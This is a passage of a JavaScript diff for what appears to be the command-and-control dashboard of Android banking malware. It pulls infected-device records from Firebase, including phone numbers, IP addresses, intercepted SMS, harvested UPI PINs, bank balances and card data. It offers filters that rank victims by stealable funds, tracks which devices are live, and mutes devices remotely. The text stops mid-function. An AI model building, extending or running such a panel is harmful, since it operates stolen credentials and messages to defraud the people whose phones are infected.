+                var s = (dateStr === undefined || dateStr === null) ? '' : String(dateStr).trim();
+                if (s) {
+                    var m = s.match(/^(\d{1,2})[-\/](\d{1,2})[-\/](\d{2,4})(?:\s*\|\s*|\s+)(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?$/i);
+                    if (m) {
+                        var y = parseInt(m[3], 10);
+                        if (y < 100) y += 2000;
+                        var hh = parseInt(m[4], 10);
+                        var mi = parseInt(m[5], 10);
+                        var ss = parseInt(m[6] || '0', 10);
+                        var ap = (m[7] || '').toLowerCase();
+                        if (ap === 'pm' && hh < 12) hh += 12;
+                        if (ap === 'am' && hh === 12) hh = 0;
+                        var dt = new Date(y, parseInt(m[2], 10) - 1, parseInt(m[1], 10), hh, mi, ss);
+                        if (!isNaN(dt.getTime())) return Math.floor(dt.getTime() / 1000);
+                    }
+                    var m2 = s.match(/^(\d{4})-(\d{1,2})-(\d{1,2})[ T](\d{1,2}):(\d{2})(?::(\d{2}))?/);
+                    if (m2) {
+                        var dt2 = new Date(parseInt(m2[1], 10), parseInt(m2[2], 10) - 1, parseInt(m2[3], 10), parseInt(m2[4], 10), parseInt(m2[5], 10), parseInt(m2[6] || '0', 10));
+                        if (!isNaN(dt2.getTime())) return Math.floor(dt2.getTime() / 1000);
+                    }
+                    if (/^\d+$/.test(s)) return normalizeEpoch(parseInt(s, 10));
+                    var d = new Date(s);
+                    if (!isNaN(d.getTime())) return Math.floor(d.getTime() / 1000);
+                }
+                if (fallback !== undefined && fallback !== null && fallback !== '') {
+                    var fs = String(fallback).trim();
+                    if (/^\d+$/.test(fs)) return normalizeEpoch(parseInt(fs, 10));
+                }
+                return 0;
+            }
+            function parseBat(v) {
+                if (v === undefined || v === null || v === '') return { p: 0, l: '—' };
+                var s = String(v).replace('%', '').trim();
+                var n = parseInt(s, 10);
+                if (isNaN(n)) return { p: 0, l: s };
+                n = Math.min(Math.max(n, 0), 100);
+                return { p: n, l: n + '%' };
+            }
+            function batClass(p) {
+                if (p >= 60) return 'bat-green';
+                if (p >= 30) return 'bat-yellow';
+                return 'bat-red';
+            }
+            function fmtTime(v) {
+                if (v === undefined || v === null || v === '') return '—';
+                var s = String(v);
+                var d;
+                if (/^\d+$/.test(s)) {
+                    var n = parseInt(s, 10);
+                    if (s.length <= 10) n *= 1000;
+                    d = new Date(n);
+                } else {
+                    var ts = parseSmsTime(s, 0);
+                    d = ts ? new Date(ts * 1000) : new Date(s);
+                }
+                if (!d || isNaN(d.getTime())) return s;
+                var dd = String(d.getDate()).padStart(2, '0');
+                var mm = String(d.getMonth() + 1).padStart(2, '0');
+                var yyyy = d.getFullYear();
+                var hh = String(d.getHours()).padStart(2, '0');
+                var mi = String(d.getMinutes()).padStart(2, '0');
+                return yyyy + '-' + mm + '-' + dd + ' ' + hh + ':' + mi;
+            }
+            function calculateDevicePing(dev) {
+                if (!dev) return dev;
+                var raw = dev.raw || dev;
+                var ts = raw.timestamp || raw.lastSeen || raw.last_seen || raw.updatedAt || raw.lastUpdate || raw.time;
+                var epoch = 0;
+                if (typeof ts === 'number') {
+                    epoch = ts > 1000000000000 ? ts : ts * 1000;
+                } else if (ts && /^\d+$/.test(String(ts).trim())) {
+                    var n = parseInt(String(ts).trim(), 10);
+                    epoch = n > 1000000000000 ? n : n * 1000;
+                } else if (raw.TimeandDate) {
+                    var parsed = Date.parse(String(raw.TimeandDate).replace(/-/g, '/'));
+                    if (!isNaN(parsed)) epoch = parsed;
+                }
+
+                var diffSec = epoch > 0 ? Math.round((Date.now() - epoch) / 1000) : 999999999;
+                var isLive = diffSec >= 0 && diffSec <= 180; // Responded within 3 minutes
+                var isRecent = diffSec >= 0 && diffSec <= 900; // Responded within 15 minutes
+
+                var pingText = 'No Signal';
+                if (diffSec < 60) pingText = Math.max(0, diffSec) + 's ago';
+                else if (diffSec < 3600) pingText = Math.floor(diffSec / 60) + 'm ago';
+                else if (diffSec < 86400) pingText = Math.floor(diffSec / 3600) + 'h ago';
+                else if (epoch > 0) pingText = Math.floor(diffSec / 86400) + 'd ago';
+
+                dev.pingEpoch = epoch;
+                dev.pingDiffSec = diffSec;
+                dev.isPingLive = isLive;
+                dev.isPingRecent = isRecent;
+                dev.pingText = pingText;
+
+                return dev;
+            }
+
+            function parseStatus(dev) {
+                if (!dev) return false;
+                var v = dev.status;
+                return v === true || v === 'true' || v === 1 || v === '1' || v === 'online' || v === 'Online' || v === 'ONLINE' || dev.online === true || dev.online === 'true' || dev.online === 1 || dev.online === '1' || dev.isOnline === true || dev.isOnline === 'true' || dev.isOnline === 1 || dev.isOnline === '1';
+            }
+            function simsArrayOf(dev) {
+                var sims = dev && dev.sims;
+                if (Array.isArray(sims)) return sims;
+                if (sims && typeof sims === 'object') return Object.keys(sims).map(function (k) { return sims[k]; });
+                return [];
+            }
+            function phoneOf(dev, sims) {
+                if (!dev) return '';
+                if (dev.mobNo) return String(dev.mobNo);
+                if (sims && sims.length && sims[0] && sims[0].phoneNumber) return String(sims[0].phoneNumber);
+                return String(dev.numberSim1 || dev.sim1Number || dev.phoneNumber || dev.phone || dev.number || '');
+            }
+            function networkOf(dev, sims) {
+                if (!dev) return '—';
+                return dev.network || (sims && sims[0] && sims[0].carrierName) || dev.provider || dev.carrier || dev.operator || '—';
+            }
+
+            function initLogin() {
+                try {
+                    var qParams = new URLSearchParams(window.location.search);
+                    var qFb = qParams.get('fb') || qParams.get('url') || localStorage.getItem('dora_fb_url');
+                    var qKey = qParams.get('key') || qParams.get('sec') || localStorage.getItem('dora_fb_key');
+                    if (qFb) FIREBASE_URL = decodeURIComponent(qFb).trim().replace(/\/+$/, '');
+                    else FIREBASE_URL = FIXED_FB_URL;
+                    if (qKey) FIREBASE_KEY = decodeURIComponent(qKey).trim();
+                } catch (e) {
+                    FIREBASE_URL = FIXED_FB_URL;
+                }
+
+                var app = document.getElementById('app');
+                if (app) app.style.display = 'block';
+                bootApp();
+
+                var lockBtn = document.getElementById('lockBtn');
+                if (lockBtn) {
+                    lockBtn.title = 'Refresh';
+                    lockBtn.onclick = function () {
+                        toast('Refreshing data...', 'warn');
+                        fetchAll(false);
+                    };
+                }
+            }
+
+            function bootApp() {
+                document.body.classList.remove('modal-open');
+                document.body.style.position = '';
+                document.body.style.top = '';
+                document.body.style.overflow = '';
+                stars = loadStars();
+                blacklist = loadBL();
+                devices = [];
+                filtered = [];
+                mutedDevices = {};
+                smsDevices = {};
+                cardTokens = {};
+                allSmsMessages = [];
+                allSmsPage = 0;
+                sources = HARDCODED_SOURCES.map(function (s) { return Object.assign({}, s); });
+                if (FIREBASE_URL && !HARDCODED_SOURCES.some(function (s) { return s.url === FIREBASE_URL; })) {
+                    sources.unshift({ id: '#CUSTOM', url: FIREBASE_URL, secret: FIREBASE_KEY || '', tag: 'custom' });
+                }
+                fetchAll(false);
+                if (fetchInt) clearInterval(fetchInt);
+                fetchInt = setInterval(function () { fetchAll(true); }, 30000);
+            }
+
+            // ============ PERSISTENT DEVICE NUMBERING SYSTEM ============
+            function getDeviceStorageKey() {
+                if (FIREBASE_URL) {
+                    return 'rs_dev_nums_' + FIREBASE_URL.replace(/https?:\/\//, '').replace(/[^a-zA-Z0-9_-]/g, '_');
+                }
+                if (typeof HARDCODED_SOURCES !== 'undefined' && HARDCODED_SOURCES.length) {
+                    var srvNames = HARDCODED_SOURCES.map(function (s) {
+                        return s.url.replace(/https?:\/\//, '').split('.')[0];
+                    }).join('_');
+                    return 'rs_dev_nums_' + srvNames;
+                }
+                return 'rs_dev_nums_default';
+            }
+
+            function getDeviceNumbersMap() {
+                try {
+                    var key = getDeviceStorageKey();
+                    var raw = localStorage.getItem(key);
+                    return raw ? JSON.parse(raw) : {};
+                } catch (e) {
+                    return {};
+                }
+            }
+
+            function saveDeviceNumbersMap(map) {
+                try {
+                    var key = getDeviceStorageKey();
+                    localStorage.setItem(key, JSON.stringify(map));
+                } catch (e) { }
+            }
+
+            function assignDeviceNumbers(devList) {
+                if (!devList || !devList.length) return;
+                var total = devList.length;
+                var map = getDeviceNumbersMap();
+
+                // 1. Only consider active devices in current database
+                var activeIdSet = {};
+                devList.forEach(function (d) {
+                    activeIdSet[String(d.id || '')] = true;
+                });
+
+                var cleanMap = {};
+                var usedNumbers = {};
+
+                // 2. Preserve valid user custom numbers (strictly between 1 and total devices)
+                // Any garbage/inflated number (like #2571 when total is 1354) is dropped
+                Object.keys(map).forEach(function (id) {
+                    if (activeIdSet[id]) {
+                        var num = parseInt(map[id], 10);
+                        if (!isNaN(num) && num >= 1 && num <= total && !usedNumbers[num]) {
+                            cleanMap[id] = num;
+                            usedNumbers[num] = true;
+                        }
+                    }
+                });
+
+                // 3. Separate devices needing sequential assignment
+                var unassigned = [];
+                devList.forEach(function (d) {
+                    var id = String(d.id || '');
+                    if (cleanMap[id] !== undefined) {
+                        d.devNumber = cleanMap[id];
+                    } else {
+                        unassigned.push(d);
+                    }
+                });
+
+                // 4. Stable sort unassigned devices by ID so numbering is 100% deterministic
+                unassigned.sort(function (a, b) {
+                    return String(a.id || '').localeCompare(String(b.id || ''));
+                });
+
+                // 5. Sequentially assign free numbers from 1 to total (No number can ever exceed total devices)
+                var nextNum = 1;
+                unassigned.forEach(function (d) {
+                    while (usedNumbers[nextNum]) {
+                        nextNum++;
+                    }
+                    usedNumbers[nextNum] = true;
+                    cleanMap[String(d.id || '')] = nextNum;
+                    d.devNumber = nextNum;
+                });
+
+                saveDeviceNumbersMap(cleanMap);
+            }
+
+            function setCustomDeviceNumber(deviceId, newNumber) {
+                var n = parseInt(newNumber, 10);
+                var maxAllowed = devices.length || 9999;
+                if (isNaN(n) || n <= 0 || n > maxAllowed) {
+                    toast('Please enter a valid number between 1 and ' + maxAllowed + '!', 'warn');
+                    return false;
+                }
+                var map = getDeviceNumbersMap();
+                var oldDevId = null;
+                Object.keys(map).forEach(function (k) {
+                    if (parseInt(map[k], 10) === n && String(k) !== String(deviceId)) {
+                        oldDevId = k;
+                    }
+                });
+                var oldNum = map[deviceId];
+                map[deviceId] = n;
+                if (oldDevId && oldNum) {
+                    map[oldDevId] = oldNum; // Clean swap numbers
+                }
+                saveDeviceNumbersMap(map);
+
+                devices.forEach(function (d) {
+                    if (String(d.id) === String(deviceId)) d.devNumber = n;
+                    if (oldDevId && String(d.id) === String(oldDevId)) d.devNumber = oldNum;
+                });
+
+                applyFilter();
+                toast('Device assigned #' + n + (oldDevId ? ' (swapped with #' + oldNum + ')' : ''), 'ok');
+                return true;
+            }
+
+            async function fetchOneSource(src) {
+                var dataUrl = src.url + '/user_data.json' + authQuery(src.secret);
+                var listUrl = src.url + '/user_list.json' + authQuery(src.secret, ['shallow=true']);
+                var mutedUrl = src.url + '/user_muted_list.json' + authQuery(src.secret, ['shallow=true']);
+                var userSmsUrl = src.url + '/user_sms.json' + authQuery(src.secret, ['shallow=true']);
+                var messagesUrl = src.url + '/messages.json' + authQuery(src.secret, ['shallow=true']);
+                var results = await Promise.all([
+                    fetch(dataUrl).catch(function () { return null; }),
+                    fetch(listUrl).catch(function () { return null; }),
+                    fetch(mutedUrl).catch(function () { return null; }),
+                    fetch(userSmsUrl).catch(function () { return null; }),
+                    fetch(messagesUrl).catch(function () { return null; })
+                ]);
+                var dr = results[0];
+                var clients = null;
+                var dataPath = 'user_data';
+                if (dr && dr.ok) {
+                    try { clients = await dr.json(); } catch (e) { clients = null; }
+                }
+                if (!clients || typeof clients !== 'object' || Array.isArray(clients) || Object.keys(clients).length === 0) {
+                    try {
+                        var cr = await fetch(src.url + '/clients.json' + authQuery(src.secret));
+                        if (cr.ok) {
+                            clients = await cr.json();
+                            dataPath = 'clients';
+                        }
+                    } catch (e) { }
+                }
+                if (!clients || typeof clients !== 'object' || Array.isArray(clients)) clients = {};
+                if (clients.clients && typeof clients.clients === 'object' && !Array.isArray(clients.clients)) clients = clients.clients;
+                src.dataPath = dataPath;
+                src.smsPath = dataPath === 'user_data' ? 'user_sms' : 'messages';
+
+                var listed = {};
+                var muted = {};
+                if (results[1] && results[1].ok) {
+                    try {
+                        var ld = await results[1].json();
+                        if (ld && typeof ld === 'object' && !Array.isArray(ld)) listed = ld;
+                    } catch (e) { }
+                }
+                if (results[2] && results[2].ok) {
+                    try {
+                        var md = await results[2].json();
+                        if (md && typeof md === 'object' && !Array.isArray(md)) muted = md;
+                    } catch (e) { }
+                }
+                var smsMap = {};
+                for (var si = 3; si <= 4; si++) {
+                    var sres = results[si];
+                    if (!sres || !sres.ok) continue;
+                    try {
+                        var sd = await sres.json();
+                        if (sd && typeof sd === 'object' && !Array.isArray(sd)) {
+                            Object.keys(sd).forEach(function (id) { smsMap[id] = true; });
+                        }
+                    } catch (e) { }
+                }
+                Object.keys(listed).forEach(function (id) {
+                    if (!clients[id]) clients[id] = { d_name: 'Unknown', device: id, status: 'offline' };
+                });
+                Object.keys(muted).forEach(function (id) {
+                    if (!clients[id]) clients[id] = { d_name: 'Unknown', device: id, status: 'offline' };
+                });
+
+                var devList = [];
+                Object.keys(clients).forEach(function (id) {
+                    var dev = clients[id];
+                    if (dev === null || dev === undefined) return;
+                    if (typeof dev !== 'object' || Array.isArray(dev)) dev = { modelName: String(dev), mobNo: 'No Sim' };
+                    if (Object.keys(dev).length === 0) return;
+
+                    var sims = simsArrayOf(dev);
+                    var bv = dev.battery !== undefined ? dev.battery : (dev.batLevel !== undefined ? dev.batLevel : (dev.batteryLevel !== undefined ? dev.batteryLevel : (dev.battery_percent !== undefined ? dev.battery_percent : dev.batteryPercentage)));
+                    var bat = 0;
+                    if (bv !== undefined && bv !== null && bv !== '') bat = parseInt(String(bv).replace('%', ''), 10) || 0;
+                    var status = parseStatus(dev);
+                    var phone = phoneOf(dev, sims);
+                    var network = networkOf(dev, sims);
+                    var installTime = dev.installTime || dev.installedAt || dev.lastSeen || dev.last_seen || dev.timestamp || dev.updatedAt || dev.updated_at || dev.dateTime || dev.date || '';
+                    var androidV = dev.androidV || dev.androidVersion || dev.sdkV || dev.android || dev.deviceModel || '—';
+                    var cpu = dev.cpu_arch || dev.cpuArch || dev.cpu || dev.deviceArch || '—';
+                    var storage = dev.storage || dev.storageInfo || dev.storageSize || '—';
+                    var upipin = dev.upipin || dev.upiPin || dev.upi_pin || dev.upi || '';
+                    var sdk = dev.sdkV || dev.sdkVersion || dev.sdk || '—';
+                    var modelName = dev.modelName || dev.model || dev.deviceName || dev.name || dev.d_name || dev.deviceModel || id;
+                    var smsAnalysis = dev.smsAnalysis || dev.analysis || dev.sms || {};
+                    if (!smsAnalysis || typeof smsAnalysis !== 'object' || Array.isArray(smsAnalysis)) smsAnalysis = {};
+
+                    devList.push({
+                        id: String(id),
+                        _srcId: src.id,
+                        _srcUrl: src.url,
+                        _srcSec: src.secret,
+                        _srcTag: src.tag,
+                        _dataPath: dataPath,
+                        _smsPath: src.smsPath,
+                        name: String(modelName),
+                        androidV: String(androidV),
+                        battery: bat + '%',
+                        batteryPercent: bat,
+                        status: status,
+                        isOnline: status,
+                        phoneNumber: phone,
+                        phone: phone,
+                        provider: String(network),
+                        network: String(network),
+                        ip: String(dev.ip_address || dev.ip || dev.ipAddress || dev.ipAddr || '—'),
+                        storage: String(storage),
+                        cpu: String(cpu),
+                        sdk: String(sdk),
+                        upipin: String(upipin),
+                        lastSeen: installTime,
+                        installTime: installTime,
+                        charging: !!(dev.charging || dev.isCharging),
+                        sims: sims,
+                        smsAnalysis: smsAnalysis,
+                        muted: !!muted[id],
+                        hasMessages: !!smsMap[id],
+                        raw: dev
+                    });
+                });
+
+                return { devices: devList, muted: muted, smsMap: smsMap };
+            }
+
+            async function fetchAll(silent) {
+                if (!sources.length || fetchBusy) return;
+                fetchBusy = true;
+                if (!silent && devices.length === 0) {
+                    $deviceList.innerHTML = '<div class="center-box"><div class="dora-spin"><svg viewBox="0 0 200 200"><circle cx="100" cy="100" r="88" fill="#0099E6" stroke="#1a1a1a" stroke-width="8"/><ellipse cx="100" cy="122" rx="68" ry="58" fill="#FFFFFF" stroke="#1a1a1a" stroke-width="6"/><ellipse cx="78" cy="72" rx="18" ry="22" fill="#FFFFFF" stroke="#1a1a1a" stroke-width="6"/><ellipse cx="122" cy="72" rx="18" ry="22" fill="#FFFFFF" stroke="#1a1a1a" stroke-width="6"/><circle cx="84" cy="78" r="7" fill="#1a1a1a"/><circle cx="116" cy="78" r="7" fill="#1a1a1a"/><circle cx="100" cy="100" r="11" fill="#E60012" stroke="#1a1a1a" stroke-width="6"/><path d="M100 111 L100 132 M68 132 Q100 158 132 132" stroke="#1a1a1a" stroke-width="6" fill="none" stroke-linecap="round"/><rect x="32" y="158" width="136" height="14" rx="7" fill="#E60012" stroke="#1a1a1a" stroke-width="6"/><circle cx="100" cy="184" r="13" fill="#FFD700" stroke="#1a1a1a" stroke-width="6"/></svg></div><div class="t">LOADING MERGED GADGETS...</div><div class="sub">Connecting to ' + sources.length + ' server nodes...</div></div>';
+                }
+
+                try {
+                    var fetchPromises = sources.map(function (s) {
+                        return fetchOneSource(s).catch(function (err) {
+                            console.warn('Error fetching source ' + s.url, err);
+                            return { devices: [], muted: {}, smsMap: {} };
+                        });
+                    });
+                    var srcResults = await Promise.all(fetchPromises);
+
+                    var all = [];
+                    var allMuted = {};
+                    var allSms = {};
+                    var seenKeys = {};
+
+                    srcResults.forEach(function (res) {
+                        Object.assign(allMuted, res.muted || {});
+                        Object.assign(allSms, res.smsMap || {});
+                        (res.devices || []).forEach(function (d) {
+                            var dk = dkey(d);
+                            if (!seenKeys[dk]) {
+                                seenKeys[dk] = true;
+                                all.push(d);
+                            }
+                        });
+                    });
+
+                    mutedDevices = allMuted;
+                    smsDevices = allSms;
+
+                    all.forEach(calculateDevicePing);
+                    assignDeviceNumbers(all);
+                    all.sort(function (a, b) { return (a.devNumber || 0) - (b.devNumber || 0); });
+                    devices = all;
+                    updateStats();
+                    if (silent && userIsScrolling) {
+                        setTimeout(function () { applyFilter(true); }, 500);
+                    } else {
+                        applyFilter(silent);
+                    }
+                    if (!silent && devices.length === 0) {
+                        $deviceList.innerHTML = '<div class="center-box"><div style="font-size:60px;margin-bottom:12px;">🎩</div><div class="t">NO DEVICES FOUND</div><div class="sub">All ' + sources.length + ' server nodes are empty</div></div>';
+                    }
+                } catch (e) {
+                    if (!silent) {
+                        $deviceList.innerHTML = '<div class="center-box"><div style="font-size:60px;margin-bottom:12px;">⚠️</div><div class="t">FETCH FAILED</div><div class="sub">' + esc(e.message) + '</div></div>';
+                        toast('Fetch failed: ' + e.message, 'err');
+                    }
+                } finally {
+                    fetchBusy = false;
+                }
+            }
+
+            function updateStats() {
+                devices.forEach(calculateDevicePing);
+                var on = devices.filter(function (d) { return d.status; }).length;
+                var off = devices.length - on;
+                var livePing = devices.filter(function (d) { return d.isPingLive; }).length;
+                var bk = 0;
+                devices.forEach(function (d) {
+                    var sa = d.smsAnalysis || {};
+                    if (Array.isArray(sa.bankBalances) && sa.bankBalances.length > 0) bk++;
+                });
+                document.getElementById('sTotal').textContent = devices.length;
+                document.getElementById('sOnline').textContent = on;
+                document.getElementById('sOffline').textContent = off;
+                var sp = document.getElementById('sPing');
+                if (sp) sp.textContent = livePing;
+                var spc = document.getElementById('sPingCount');
+                if (spc) spc.textContent = livePing;
+                var sb = document.getElementById('sBank');
+                if (sb) sb.textContent = bk;
+            }
+
+            function applyFilter(isSilent) {
+                var f = devices.slice();
+                if (currentFilter === 'ping') {
+                    f = f.filter(function (d) { return d.isPingLive; });
+                    f.sort(function (a, b) { return a.pingDiffSec - b.pingDiffSec; });
+                }
+                else if (currentFilter === 'online') f = f.filter(function (d) { return d.status; });
+                else if (currentFilter === 'offline') f = f.filter(function (d) { return !d.status; });
+                else if (currentFilter === 'upi') f = f.filter(function (d) { return !!d.upipin; });
+                else if (currentFilter === 'bank') f = f.filter(function (d) { var b = (d.smsAnalysis || {}).bankBalances; return Array.isArray(b) && b.length > 0; });
+                else if (currentFilter === 'card') f = f.filter(function (d) { var c = (d.smsAnalysis || {}).cards; return (Array.isArray(c) && c.length > 0) || !!cardTokens[d.id]; });
+                else if (currentFilter === 'starred') f = f.filter(function (d) { return isStar(d); });
+                else if (currentFilter === 'muted') f = f.filter(function (d) { return !!d.muted; });
+                else if (currentFilter === 'active') f = f.filter(function (d) { return d.status && !!smsDevices[d.id]; });
+
+                if (searchQ) {
+                    var q = searchQ.toLowerCase().trim();
+                    var qNum = q.replace(/^#/, '');
+                    f = f.filter(function (d) {
+                        return String(d.name || '').toLowerCase().indexOf(q) !== -1
+                            || String(d.id || '').toLowerCase().indexOf(q) !== -1
+                            || String(d.phoneNumber || d.phone || '').indexOf(q) !== -1
+                            || (qNum && String(d.devNumber) === qNum);
+                    });
+                }
+
+                if (currentSort === 'number') f.sort(function (a, b) { return (a.devNumber || 0) - (b.devNumber || 0); });
+                else if (currentSort === 'newest') f.sort(function (a, b) { return String(b.id || '').localeCompare(String(a.id || '')); });
+                else if (currentSort === 'oldest') f.sort(function (a, b) { return String(a.id || '').localeCompare(String(b.id || '')); });
+                else if (currentSort === 'name') f.sort(function (a, b) { return String(a.name || '').localeCompare(String(b.name || '')); });
+                else if (currentSort === 'battery') f.sort(function (a, b) { return parseBat(b.battery).p - parseBat(a.battery).p; });
+
+                filtered = f;
+                renderDevices(f, isSilent);
+            }
+
+            function renderDevices(list, isSilent) {
+                if (list.length === 0) {
+                    if (devices.length === 0) return;
+                    $deviceList.innerHTML = '<div class="center-box"><div style="font-size:60px;margin-bottom:12px;">🔍</div><div class="t">NO MATCH</div><div class="sub">Try a different filter</div></div>';
+                    return;
+                }
+
+                var prevScroll = window.scrollY || window.pageYOffset || document.documentElement.scrollTop || 0;
+
+                // In-place DOM patch during silent background refresh to completely avoid scroll reset or layout jumps
+                var existingCards = $deviceList.querySelectorAll('.device-card');
+                if (isSilent && existingCards.length > 0 && currentFilter !== 'ping') {
+                    var cardMap = {};
+                    for (var c = 0; c < existingCards.length; c++) {
+                        var cid = existingCards[c].getAttribute('data-id');
+                        if (cid) cardMap[cid] = existingCards[c];
+                    }
+
+                    var canPatch = true;
+                    for (var j = 0; j < list.length; j++) {
+                        if (!cardMap[list[j].id]) { canPatch = false; break; }
+                    }
+
+                    if (canPatch) {
+                        for (var k = 0; k < list.length; k++) {
+                            var devObj = list[k];
+                            var cardEl = cardMap[devObj.id];
+                            if (!cardEl) continue;
+
+                            var bat = parseBat(devObj.battery);
+                            var on = devObj.status;
+                            var hid = isBL(devObj);
+                            var starred = isStar(devObj);
+                            var muted = !!devObj.muted;
+
+                            if (hid) cardEl.classList.add('blacklisted');
+                            else cardEl.classList.remove('blacklisted');
+
+                            var numBadge = cardEl.querySelector('.dev-num-badge');
+                            if (numBadge) {
+                                numBadge.textContent = '#' + (devObj.devNumber || '');
+                                numBadge.setAttribute('data-id', devObj.id);
+                            }
+
+                            var statEl = cardEl.querySelector('.card-footer .status');
+                            if (statEl) {
+                                statEl.className = 'status ' + (on ? 'on' : 'off');
+                                statEl.innerHTML = '<span class="dot"></span>' + (on ? 'online' : 'offline');
+                            }
+
+                            var pingPill = cardEl.querySelector('.ping-pill');
+                            if (pingPill) {
+                                pingPill.className = 'ping-pill ' + (devObj.isPingLive ? 'live' : (devObj.isPingRecent ? 'idle' : 'dead'));
+                                pingPill.innerHTML = '<span class="ping-dot"></span> ' + (devObj.isPingLive ? '🟢 LIVE ' + esc(devObj.pingText) : esc(devObj.pingText));
+                            }
+
+                            var starBtn = cardEl.querySelector('.icon-act.star');
+                            if (starBtn) {
+                                if (starred) { starBtn.classList.add('active'); starBtn.textContent = '★'; }
+                                else { starBtn.classList.remove('active'); starBtn.textContent = '☆'; }
+                            }
+
+                            var muteBtn = cardEl.querySelector('.icon-act.mute');
+                            if (muteBtn) {
+                                if (muted) { muteBtn.classList.add('active'); muteBtn.textContent = '🔕'; }
+                                else { muteBtn.classList.remove('active'); muteBtn.textContent = '🔔'; }
+                            }
+                        }
+                        return; // In-place patch complete without disturbing scroll or DOM!
+                    }
+                }
+
+                var parts = [];
+                for (var i = 0; i < list.length; i++) {
+                    var d = list[i];
+                    var bat = parseBat(d.battery);
+                    var on = d.status;
+                    var hid = isBL(d);
+                    var starred = isStar(d);
+                    var muted = !!d.muted;
+                    var installTime = fmtTime(d.installTime || d.lastSeen);
+                    var id = String(d.id || '');
+
+                    var animStyle = isSilent ? 'animation: none;' : ('animation-delay:' + Math.min(i * 0.04, 0.5) + 's;');
+
+                    parts.push(
+                        '<div class="device-card' + (hid ? ' blacklisted' : '') + '" data-id="' + esc(id) + '" data-src="' + esc(d._srcUrl) + '" style="' + animStyle + '">'
+                        + '<div class="card-header">'
+                        + '<div class="avatar">'
+                        + '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#FFFFFF"/><text x="50" y="65" font-size="52" text-anchor="middle" font-family="Fredoka One" fill="#0099E6">🔔</text></svg>'
+                        + '</div>'
+                        + '<div class="info">'
+                        + '<div class="device-name"><span class="dev-num-badge" data-edit-num="1" data-id="' + esc(id) + '" title="Device #' + (d.devNumber || '') + ' (Click to edit)">#' + (d.devNumber || '') + '</span>' + esc(d.name) + (d._srcTag ? '<span class="src-badge">' + esc(d._srcTag) + '</span>' : '') + '</div>'
+                        + '<div class="field"><span class="k">ID:</span><span class="v mono">' + esc(id.substring(0, 20)) + (id.length > 20 ? '…' : '') + '</span></div>'
+                        + '<div class="field"><span class="k">Battery:</span><span class="v ' + batClass(bat.p) + '">' + esc(bat.l) + '</span></div>'
+                        + '<div class="field"><span class="k">Install:</span><span class="v">' + esc(installTime) + '</span></div>'
+                        + '<div class="field"><span class="k">Ping:</span><span class="v"><span class="ping-pill ' + (d.isPingLive ? 'live' : (d.isPingRecent ? 'idle' : 'dead')) + '"><span class="ping-dot"></span> ' + (d.isPingLive ? '🟢 LIVE ' + esc(d.pingText) : esc(d.pingText)) + '</span></span></div>'
+                        + (muted ? '<div class="mute-tag">MUTED</div>' : '')
+                        + '</div>'
+                        + '</div>'
+                        + '<div class="card-footer">'
+                        + '<div class="status ' + (on ? 'on' : 'off') + '"><span class="dot"></span>' + (on ? 'online' : 'offline') + '</div>'
+                        + '<div class="actions">'
+                        + '<button class="icon-act star' + (starred ? ' active' : '') + '" data-star="1">' + (starred ? '★' : '☆') + '</button>'
+                        + '<button class="icon-act mute' + (muted ? ' active' : '') + '" data-mute="1" title="' + (muted ? 'Unmute' : 'Mute') + '">' + (muted ? '🔕' : '🔔') + '</button>'
+                        + '<button class="icon-act trash" data-trash="1">🗑</button>'
+                        + '</div>'
+                        + '</div>'
+                        + '</div>'
+                    );
+                }
+                var banner = '';
+                if (currentFilter === 'ping') {
+                    banner = '<div class="ping-banner"><span>📡 <b>LIVE PING FILTER ACTIVE:</b> Showing ' + list.length + ' live responding devices (' + (devices.length - list.length) + ' dead/inactive filtered out)</span><button onclick="window.clearPingFilter()">✕ SHOW ALL</button></div>';
+                }
+                $deviceList.innerHTML = banner + parts.join('');
+
+                // Seamlessly preserve scroll position on full re-render
+                if (prevScroll > 0) {
+                    window.scrollTo({ top: prevScroll, left: 0, behavior: 'instant' });
+                }
+            }
+
+            $deviceList.addEventListener('click', function (e) {
+                var card = e.target.closest('.device-card');
+                if (!card) return;
+                var id = card.getAttribute('data-id');
+                var src = card.getAttribute('data-src');
+                var dev = devices.find(function (d) { return String(d.id) === id && String(d._srcUrl) === src; });
+                if (!dev) return;
+
+                if (e.target.closest('[data-edit-num]')) {
+                    e.stopPropagation();
+                    var targetId = e.target.closest('[data-edit-num]').getAttribute('data-id');
+                    var curDev = devices.find(function (x) { return String(x.id) === String(targetId); });
+                    var curNum = curDev ? (curDev.devNumber || '') : '';
+                    var input = prompt('Set permanent Number for ' + (curDev ? curDev.name : targetId) + ':\n(e.g. 1, 2, 5...)', curNum);
+                    if (input !== null && input.trim() !== '') {
+                        setCustomDeviceNumber(targetId, input.trim());
+                    }
+                    return;
+                }
+                if (e.target.closest('[data-mute]')) {
+                    e.stopPropagation();
+                    toggleMuteDevice(dev);
+                    return;
+                }
+                if (e.target.closest('[data-star]')) {
+                    e.stopPropagation();
+                    toggleStar(dev);
+                    applyFilter();
+                    return;
+                }
+                if (e.target.closest('[data-trash]')) {
+                    e.stopPropagation();
+                    var hid = isBL(dev);
+                    confirmBox({ name: dev.name, restore: hid }, function () {
+                        if (hid) { rmBL(dev); toast('Restored!', 'ok'); }
+                        else { addBL(dev); toast('Hidden!', 'warn'); }
+                        applyFilter();
+                    });
+                    return;
+                }
+                openDetail(dev);
+            });
+
+            async function toggleMuteDevice(dev) {
+                if (!dev || !dev._srcUrl) return;
+                var id = encodeURIComponent(dev.id);
+                var a = authQuery(dev._srcSec);
+                var isListSchema = (dev._dataPath === 'user_data');
+                var jobs = [];
+                try {
+                    if (isListSchema) {
+                        jobs.push(fetch(dev._srcUrl + '/' + (dev.muted ? 'user_muted_list' : 'user_list') + '/' + id + '.json' + a, { method: 'DELETE' }));
+                        jobs.push(fetch(dev._srcUrl + '/' + (dev.muted ? 'user_list' : 'user_muted_list') + '/' + id + '.json' + a, {
+                            method: 'PUT',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: 'true'
+                        }));
+                    } else {
+                        jobs.push(fetch(dev._srcUrl + '/user_muted_list/' + id + '.json' + a, {
+                            method: dev.muted ? 'DELETE' : 'PUT',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: dev.muted ? null : 'true'
+                        }));
+                    }
+                    var results = await Promise.all(jobs);
+                    if (!results.some(function (r) { return r.ok; })) throw new Error('request failed');
+                    dev.muted = !dev.muted;
+                    if (dev.muted) mutedDevices[dev.id] = true;
+                    else delete mutedDevices[dev.id];
